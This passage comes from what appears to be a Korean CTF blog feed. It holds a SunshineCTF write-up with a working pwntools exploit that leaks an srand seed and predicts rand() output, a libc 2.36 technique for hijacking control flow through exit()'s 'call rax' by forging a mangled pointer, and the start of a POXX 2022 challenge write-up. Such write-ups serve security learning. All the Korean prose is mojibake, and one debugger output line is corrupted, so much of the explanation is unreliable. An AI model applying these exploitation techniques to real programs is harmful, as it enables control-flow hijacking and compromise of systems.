class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">10</span>; i &lt;= <span class="number">999999999</span>; i *= <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay %s, I&#x27;m thinking of a number between 1 and %d. What is it?\n[&gt;] &quot;</span>, dest, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v7 = rand() % i + <span class="number">1</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    src = sub_1349();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(src, <span class="string">&quot;%d&quot;</span>, &amp;v4) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bad guess!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too low!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too high!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s it!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow, did you hack into my brain? Great guessing! You&#x27;ll be a CTF star in no time!&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Flag file is missing!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">100</span>, stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error reading from flag file!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  v10 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    *v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a reward for you: %s\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìš”ì•½í•˜ìžë©´ <code>for ( i = 10; i &lt;= 999999999; i *= 10 )</code> ë™ì•ˆ ëžœë¤í•œ ìˆ˜ë¥¼ ë§žì¶°ì•¼ í•œë‹¤. </p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>CTF team nameì„ ìž…ë ¥í•  ë•Œ srand ì¸ìž leakì´ ê°€ëŠ¥í•˜ë‹¤.<br><code>&amp;dest[0x14]</code>ì— 4ë°”ì´íŠ¸ë¡œ srandì˜ ì¸ìžë¡œ <code>/dev/urandom</code>ì˜ ëžœë¤í•œ ê°’ì„ ìž…ë ¥í•œë‹¤. í›„ì— CTF team nameì„ ì‚¬ìš©ìžì—ê²Œ srcì— ìž…ë ¥ë°›ê³  <code>strncpy(dest, src, 0x14uLL);</code> ì—ì„œ destì— ë³µì‚¬í•œë‹¤. printfëŠ” ê³µë°±ê¹Œì§€ ì¶œë ¥í•˜ê¸° ë•Œë¬¸ì— CTF team nameì— 0x14ë¥¼ ê½‰ê½‰ ì±„ì›Œì„œ ìž…ë ¥í•´ì£¼ë©´ <code>&amp;dest[0x14]</code>ë„ ì¶œë ¥í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55f716d94430: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x55f716d94440: 0xd9fd281441414141      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>srand ì¸ìž leakí•˜ëŠ” python ì½”ë“œ ìž‘ì„±</li><li>í•´ë‹¹ ì¸ìžë¥¼ ê°€ì§€ê³  random ìˆ˜ë¥¼ ì¶œë ¥í•˜ëŠ” c í”„ë¡œê·¸ëž¨ ìž‘ì„±</li><li>ì¸ìžë¥¼ c í”„ë¡œê·¸ëž¨ì— ë„˜ê²¨ì£¼ì–´ random ìˆ˜ë¥¼ ì¶œë ¥í•˜ëŠ” ê²ƒì„ ë°›ì•„ì˜¤ëŠ” python ì½”ë“œ ìž‘ì„±</li><li>ë¬¸ì œ í”„ë¡œê·¸ëž¨ì— ë„˜ê¸°ê¸°</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>&#96;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;sunshinectf.games&quot;</span>, <span class="number">22000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;CTF team?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x14</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">info(<span class="built_in">str</span>(seed))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argv1 = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">argv1[<span class="number">1</span>] = <span class="built_in">str</span>(seed)</span><br><span class="line"></span><br><span class="line">pp = process(executable=<span class="string">&#x27;./a.out&#x27;</span>, argv=argv1)</span><br><span class="line"></span><br><span class="line">v7 = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    v7[i] = pp.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pp.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;[&gt;]&#x27;</span>, v7[i])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc random.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*printf(&quot;%s\n&quot;, argv[1]);*/</span></span><br><span class="line">    <span class="comment">/*printf(&quot;%d\n&quot;, atoi(argv[1]));*/</span></span><br><span class="line">    </span><br><span class="line">    srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">10</span>; i &lt; <span class="number">999999999</span>; i *= <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v7 = rand() % i + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v7);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="struct-unpack"><a href="#struct-unpack" class="headerlink" title="struct.unpack"></a>struct.unpack</h4><p><code>struct.unpack</code>ì˜ ì²«ë²ˆì§¸ ì¸ìžë¡œ Ië¥¼ ì£¼ë©´ byteë¥¼ unsigned intë¡œ ë°”ê¾¸ì–´ì£¼ëŠ” ê²ƒì„ ì•Œê²Œ ë˜ì—ˆë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;i&#x27;, b&#x27;\x7f\x84\x4e\xcd&#x27;)</span><br><span class="line">(-850492289,)</span><br><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;I&#x27;, b&#x27;\x7f\x84\x4e\xcd&#x27;)</span><br><span class="line">(3444475007,)</span><br></pre></td></tr></table></figure><p><code>struct.unpack</code>ë§Œ ë³´ë©´ ì–´ìƒ‰í–ˆëŠ”ë° ì´ì œ ì¡°ê¸ˆ ìµìˆ™í•´ì¡Œë‹¤.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun&#123;gu355y_ch4ll3ng35_4r3_my_f4v0r1t3!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> random </tag>
            
            <tag> srand </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to RIP control in libc 2.36</title>
      <link href="/221122-how_to_rip_control_in_libc236/"/>
      <url>/221122-how_to_rip_control_in_libc236/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>ìœ„ ë¬¸ì œë¥¼ libc 2.36ì˜ <code>exit</code> í•¨ìˆ˜ì˜ <code>call rax</code> ê°€ì ¯ì„ ì´ìš©í•˜ì—¬ ìµìŠ¤í”Œë¡œìž‡í•˜ëŠ” ê³¼ì •ì´ë‹¤.</p><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>ë•ŒëŠ” ë°”ì•¼íë¡œ ì•½ í•œ ë‹¬ ì „.. POXX 2022 ë³¸ì„  ë¬¸ì œ ì¶œì œë¥¼ í•˜ë˜ ì¤‘ì´ì—ˆë‹¤. í•´ë‹¹ ë¬¸ì œëŠ” fsbì™€ aawê°€ ê°€ëŠ¥í•˜ì§€ë§Œ FULL RELROê°€ ê±¸ë ¤ìžˆì–´ GOT overwritingì€ ë¶ˆê°€ëŠ¥ í•´ì„œ ì¼ë°˜ì ìœ¼ë¡œ <code>malloc_hook</code>ì´ë‚˜ <code>free_hook</code>ì„ ë®ì–´ì„œ ìµìŠ¤í•´ì•¼ í•œë‹¤. í•˜ì§€ë§Œ í•´ë‹¹ ë¬¸ì œì—ì„œì˜ libc ë²„ì „ì´ ìµœì‹  ë²„ì „(2.36) ì´ê¸° ë•Œë¬¸ì— ìœ„ì™€ ê°™ì€ ë°©ë²•ì€ ìµìŠ¤ê°€ ë¶ˆê°€ëŠ¥í•˜ë‹¤. ì™œëƒí•˜ë©´ ë‘˜ ë‹¤ ì‚¬ìš©ì„ ì•ˆí•˜ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆê¸° ë•Œë¬¸ì´ë‹¤. í•´ë‹¹ ê³¼ì •ì„ ë¶„ì„í•˜ê²Œ ëœ ê³„ê¸°ëŠ”, printfì—ì„œì˜ malloc í˜¸ì¶œê³¼ exitì—ì„œì˜ free í˜¸ì¶œì„ ì‚´íŽ´ë³´ë©´ì„œ ë¶„ì„í•˜ê²Œ ë˜ì—ˆë‹¤. </p><p><code>malloc_hook</code>ê³¼ <code>free_hook</code>ì„ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ìµìŠ¤ ë°©ë²•ì´ ìžˆì„ê¹Œ ë¶„ì„ì„ ì§„í–‰í•˜ë‹¤ê°€ <code>exit</code> í•¨ìˆ˜ì—ì„œ <code>call rax</code> ë¼ëŠ” ì“¸ë§Œí•œ ê°€ì ¯ì„ ë³´ì•˜ê³  í•´ë‹¹ ë¶€ë¶„ íŠ¸ë¦¬ê±°ë¥¼ ì§„í–‰í•´ë³´ì•˜ë‹¤. ë¬¼ë¡  ì—¬ëŸ¬ê°€ì§€ì˜ ì‹œí–‰ì°©ì˜¤ê°€ ìžˆì—ˆì§€ë§Œ í•œ ë‹¬ ì „ì˜ ì¼ì´ë¼ ê¸°ì–µì´ ê°€ë¬¼í•˜ê¸°ë„ í•´ì„œ íŠ¸ë¦¬ê±°ì— ì„±ê³µí•œ ê³¼ì •ë§Œ ê°„ëžµí•˜ê²Œ ë¸”ë¡œê·¸ì— ìž‘ì„±í•´ë³´ê² ë‹¤.</p><h2 id="How-to-RIP-control-in-libc-2-36"><a href="#How-to-RIP-control-in-libc-2-36" class="headerlink" title="How to RIP control in libc 2.36"></a>How to RIP control in libc 2.36</h2><p><img src="/images/221122-how_to_rip_control_in_libc236/221122-1.png" alt="img1">  </p><p>ì£¼ëª©í•  ê°€ì ¯ì€ <code>loc_3AF9E</code>ì˜ <code>call rax</code>ì´ê³  <code>rax</code>ì— ì§‘ì¤‘ ë° ë™ì  ë¶„ì„ì„ í†µí•´ ìµœì¢…ì ìœ¼ë¡œ ë¶„ì„í•  ë¸”ë¡ì€ <code>loc_3AF70</code>ì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000003AF70</span><br><span class="line">.text:000000000003AF70 loc_3AF70:</span><br><span class="line">.text:000000000003AF70 add     rdx, r15</span><br><span class="line">.text:000000000003AF73 mov     rax, [rdx+18h]</span><br><span class="line">.text:000000000003AF77 mov     r13, [rdx+20h]</span><br><span class="line">.text:000000000003AF7B mov     qword ptr [rdx+10h], 0</span><br><span class="line">.text:000000000003AF83 mov     edx, ebx</span><br><span class="line">.text:000000000003AF85 ror     rax, 11h</span><br><span class="line">.text:000000000003AF89 xor     rax, fs:30h</span><br><span class="line">.text:000000000003AF92 xchg    edx, [r14]</span><br><span class="line">.text:000000000003AF95 cmp     edx, 1</span><br><span class="line">.text:000000000003AF98 jg      loc_3B0B0</span><br></pre></td></tr></table></figure><p>$rax ê°’ì„ [rdx+18h]ì—ì„œ ê°€ì ¸ì™€ì„œ, ROR ì—°ì‚°ì„ ì‹œë„í•œë‹¤. ê·¸ í›„ XOR ì—°ì‚°ë„ ì§„í–‰í•œë‹¤. ì´ëŸ¬í•œ ë‘ ë²ˆì˜ ì—°ì‚°ì„ ê±°ì³ì„œ ê²°êµ­ <code>call rax</code>ë¥¼ í•œë‹¤. ìš°ë¦¬ëŠ” ìž„ì˜ ì£¼ì†Œ ì“°ê¸°ê°€ ê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ì— raxë¥¼ ì¡°ìž‘í•  ìˆ˜ ìžˆëŠ” ìƒí™©ì´ë‹¤. ë” ë‚˜ì•„ê°€ì„œ ìƒê°í•´ë³´ë©´ [rdx+18h]ì„ ì§ì ‘ ì¡°ìž‘í•  ìˆ˜ ìžˆê³ , í•´ë‹¹ ê°’ì€ ìš°ë¦¬ê°€ í˜¸ì¶œí•˜ê³  ì‹¶ì€ ì£¼ì†Œê°€ signing ëœ ê°’ìž„ì„ ì•Œ ìˆ˜ ìžˆë‹¤.</p><p>ì—­ì—°ì‚°ì„ í†µí•´ signing ëœ ê°’ì´ ë¬´ì—‡ì¸ì§€ ìˆ˜ì‹ìœ¼ë¡œ ìž‘ì„±í•´ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"></span><br><span class="line">sign = ROL(e.sym[<span class="string">&#x27;gift&#x27;</span>] ^ key, <span class="number">0x11</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>signing ëœ ê°’ì„ êµ¬í•˜ê¸° ìœ„í•´ keyë¥¼ ì•Œì•„ì•¼ í•œë‹¤. 0x3AF89ì— break pointë¥¼ ê±¸ê³  rax ë ˆì§€ìŠ¤í„°ë¥¼ 0ìœ¼ë¡œ ì„¸íŒ…í•˜ë©´ ì•„ëž˜ì˜ ì‹ì— ì˜í•´ <code>fs:30h</code> ê°’ì„ êµ¬í•  ìˆ˜ ìžˆë‹¤. ì´ ê°’ì´ keyì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 ^ A = A</span><br></pre></td></tr></table></figure><p>ê·¸ë ‡ê²Œ êµ¬í•œ <code>fs:30h</code>ì„ ë©”ëª¨ë¦¬ ìƒì—ì„œ ê²€ìƒ‰í•´ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gefâž¤  search-pattern 0x7801dafd8bba0173</span><br><span class="line">[+] Searching &#x27;\x73\x01\xba\x8b\xfd\xda\x01\x78&#x27; in memory</span><br><span class="line">[+] In (0x7fedbeb04000-0x7fedbeb07000), permission=rw-</span><br><span class="line">  0x7fedbeb04770 - 0x7fedbeb04790  â†’   &quot;\x73\x01\xba\x8b\xfd\xda\x01\x78[...]&quot;</span><br><span class="line">[+] In &#x27;/usr/lib/ld-linux-x86-64.so.2&#x27;(0x7fedbed37000-0x7fedbed39000), permission=r--</span><br><span class="line">  0x7fedbed38a70 - 0x7fedbed38a90  â†’   &quot;\x73\x01\xba\x8b\xfd\xda\x01\x78[...]&quot;</span><br><span class="line">[+] In &#x27;[stack]&#x27;(0x7fff23bf6000-0x7fff23c17000), permissdfsd</span><br><span class="line"></span><br><span class="line">\xfd\xda\x01\x78[...]&quot;</span><br></pre></td></tr></table></figure><p>stackì— ì´ë¯¸ í•´ë‹¹ ê°’ì´ ì¡´ìž¬í•˜ê³  ìžˆì—ˆê³ , í•´ë‹¹ ë¬¸ì œì—ì„œ fsb í„°ì§€ëŠ” ì£¼ì†Œê°€ ë” ë†’ì€ ê³³ì— ìœ„ì¹˜í–ˆê¸° ë•Œë¬¸ì— <code>fs:30h</code>ì„ leakí•  ìˆ˜ ìžˆë‹¤.</p><p>ë‹¤ë§Œ key ê°’ì´ í•œ ë°”ì´íŠ¸ ë°€ë ¤ ìžˆì–´ì„œ(?) ì¡°ê¸ˆì˜ ì „ì²˜ë¦¬ ê³¼ì •ì´ í•„ìš”í•˜ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff23c14cf0: 0x01dafd8bba0173f5      0x0034365f36387878</span><br></pre></td></tr></table></figure><p>leak1 &#x3D; 0x01dafd8bba0173f5<br>leak2 &#x3D; 0x0034365f36387878</p><p>leak1ì—ì„œ ë§¨ ë§ˆì§€ë§‰ ë°”ì´íŠ¸ë¥¼ ìžë¥´ê³  leak2ì—ì„œ ë§¨ ë§ˆì§€ë§‰ ë°”ì´íŠ¸ë¥¼ ê°€ì ¸ì™€ ë§¨ ì•žì— ë¶™ì—¬ì¤˜ì•¼ í•œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak1 &gt;&gt; 8 = 0x1dafd8bba0173</span><br><span class="line">leak2 &amp; 0xff = 0x78</span><br></pre></td></tr></table></figure><p>ìµœì¢…ì ìœ¼ë¡œ ì•„ëž˜ì™€ ê°™ì€ ìˆ˜ì‹ì„ í†µí•´ key ê°’ì„ êµ¬í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = (leak1 &gt;&gt; 8) + ((leak2 &amp; 0xff) &lt;&lt; 8*7)</span><br><span class="line">key = 0x7801dafd8bba0173</span><br></pre></td></tr></table></figure><p>ê²°ë¡ ì ìœ¼ë¡œ ìš°ë¦¬ëŠ” keyë¥¼ êµ¬í–ˆìœ¼ë¯€ë¡œ gift í•¨ìˆ˜ê°€ signing ëœ ê°’ì„ êµ¬í•˜ê³  ìŠ¤íƒì— ê°’ì„ ì“¸ ìˆ˜ ìžˆë‹¤. ì´ ê°’ì€ exit í•¨ìˆ˜ì˜ ë¡œì§ ì¤‘ ì¸ì¦ì´ ë˜ì–´ ìµœì¢…ì ìœ¼ë¡œ call í•  ìˆ˜ ìžˆë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(auther) Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)</title>
      <link href="/221121-poxx2022-shop_revenge/"/>
      <url>/221121-poxx2022-shop_revenge/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(0&#x2F;10) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>ì €ë²ˆì—ëŠ” ì´ê±° shellë¡œ ë°”ê¿”ì£¼ì…¨ìž–ì•„ìš”..</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â””â”€â”€ chall</span><br></pre></td></tr></table></figure><p>Dockerfileì—ì„œ libcë¥¼ ì¶”ì¶œí•´ì„œ patchí•œ ë‹¤ìŒì— ë¬¸ì œë¥¼ í’€ì–´ì•¼ í•œë‹¤. ì°¸ê³ ë¡œ ìµœì‹  libcì´ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>No canary foundë¼ê³  ë‚˜ì˜¤ì§€ë§Œ canaryê°€ ì¡´ìž¬í•œë‹¤.</p><p>FULL RELROë¼ì„œ GOT overwritingì´ ë¶ˆê°€ëŠ¥í•˜ë‹¤. ê·¸ëž˜ì„œ ë³´í†µ <code>malloc_hook</code>, <code>free_hook</code>, <code>_rtld_global._dl_rtld_lock_recursive</code> ë“±ì„ ë®ì–´ ì‹¤í–‰ íë¦„ì„ ì¡°ìž‘í•  ìˆ˜ ìžˆë‹¤. í•˜ì§€ë§Œ ë¬¸ì œì—ì„œ ìµœì‹  libcë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— <code>malloc_hook</code>ê³¼ <code>free_hook</code> ë“±ì„ ë®ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•˜ê³  ë®ì„ ë‹¤ë¥¸ ê³³ì„ ì°¾ì•„ë´ì•¼ í•œë‹¤.</p><h3 id="Souece-Code"><a href="#Souece-Code" class="headerlink" title="Souece Code"></a>Souece Code</h3><p>ida ì „ì²´ ì½”ë“œì´ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  _BYTE nptr[<span class="number">23</span>]; <span class="comment">// [rsp+29h] [rbp-17h] 